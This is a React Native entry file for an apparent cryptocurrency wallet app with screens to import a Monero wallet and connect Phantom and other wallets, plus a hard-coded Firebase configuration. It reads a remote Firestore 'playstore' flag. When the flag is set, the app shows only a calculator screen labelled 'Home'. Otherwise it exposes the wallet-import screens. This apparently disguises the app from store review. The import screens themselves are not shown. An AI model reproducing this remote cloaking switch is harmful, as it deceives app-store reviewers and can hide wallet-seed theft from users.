import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, Image } from 'react-native';
import Start from './screen/Start'
import Welcome from './screen/Welcome'
import Wallet from './screen/Wallet'
import ImportXmr from './screen/ImportXmr'
import Marketplace from './screen/Marketplace'
import ConnectPhantom from './screen/ConnectPhantom'
import Calculate from './screen/Calculate'
import { initializeApp } from 'firebase/app';
import {
  addDoc,
  collection,
  doc,
  getDoc,
  getDocs,
  getFirestore,
  setDoc,
} from "firebase/firestore";



import ConnectWallet from './screen/ConnectWallet'
import AsyncStorage from '@react-native-async-storage/async-storage';
import Home from './screen/Home'
import TopBar from './screen/component/Header'
import { NavigationContainer, DefaultTheme } from '@react-navigation/native';
import { createNativeStackNavigator } from '@react-navigation/native-stack';

const Stack = createNativeStackNavigator();

const MyTheme = {
  ...DefaultTheme,
  colors: {
    ...DefaultTheme.colors,
    background: '#fff'
  },
};

function App() {
const [importa, setImporta] = useState('')
const [playstore, setPlaystore] = useState()

 


  const readImport = async () => {
    try {
      const userAge = await AsyncStorage.getItem('@IMPORT')
      if (userAge!== null){ setImporta(userAge)}

    } catch (e) {
      alert('Failed to fetch the data from storage')
    }
  }

  
  const firebaseConfig = {
    apiKey: "AIzaSyD7FMdQk7MmcrtifUT97z1XtQNA7BZ0hok",
    authDomain: "xmr2021.firebaseapp.com",
    projectId: "xmr2021",
    storageBucket: "xmr2021.appspot.com",
    messagingSenderId: "138804317863",
    appId: "1:138804317863:web:773de3543950b7a7c71582",
    measurementId: "G-8RDCCT8D8L"
  };

  initializeApp(firebaseConfig);
  const firestore = getFirestore();


  const get = async () => {
    const querySnapshot = await getDocs(collection(firestore, "playstore"))
    querySnapshot.forEach((doc) => {
      setPlaystore(JSON.stringify([doc.data().status]))
    });
  }

  useEffect(() => {

    readImport();
    get();




  }, [])

 
 
 
  if (playstore == '[true]') {
    return (

      <NavigationContainer theme={MyTheme} >
        <Stack.Navigator>
          <Stack.Screen name="Calculate" component={Calculate}
            options={{ title: "Home", headerStyle: { backgroundColor: "#fff", } }} /></Stack.Navigator></NavigationContainer>);
  }




  if (importa.length > 0 && playstore == '[false]') {


    return (

      <NavigationContainer theme={MyTheme} >
        <Stack.Navigator>

          <Stack.Screen name="Home" component={Home} />
          <Stack.Screen name="Wallet" component={Wallet} />



        </Stack.Navigator>
      </NavigationContainer>



    );
  } else {

    return (

      <NavigationContainer theme={MyTheme} >
        <Stack.Navigator>
        

          <Stack.Screen name="Start" component={Start} />
          <Stack.Screen name="Wallet" component={Wallet} />
          <Stack.Screen name="ConnectPhantom" component={ConnectPhantom} />
          <Stack.Screen name="Marketplace" component={Marketplace} />
          <Stack.Screen name="Welcome" component={Welcome} />
          <Stack.Screen name="ConnectWallet" component={ConnectWallet} />
          <Stack.Screen name="ImportXmr" component={ImportXmr} />
          <Stack.Screen name="Home" component={Home}/>
          </Stack.Navigator>
          </NavigationContainer>



    );


  }


}


export default App;

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#fff',
    alignItems: 'center',
    justifyContent: 'center',
  },
});
